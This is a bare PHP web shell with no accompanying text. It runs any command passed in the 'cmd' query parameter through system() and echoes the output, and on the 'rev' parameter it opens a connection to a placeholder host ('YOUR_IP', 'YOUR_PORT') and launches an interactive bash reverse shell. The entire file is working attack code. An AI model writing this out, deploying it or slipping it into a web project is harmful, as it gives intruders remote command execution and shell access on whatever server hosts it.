<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
if(isset($_GET['rev'])) {
    $sock = fsockopen("YOUR_IP", YOUR_PORT);
    exec("/bin/bash -i <&3 >&3 2>&3");
}
?>
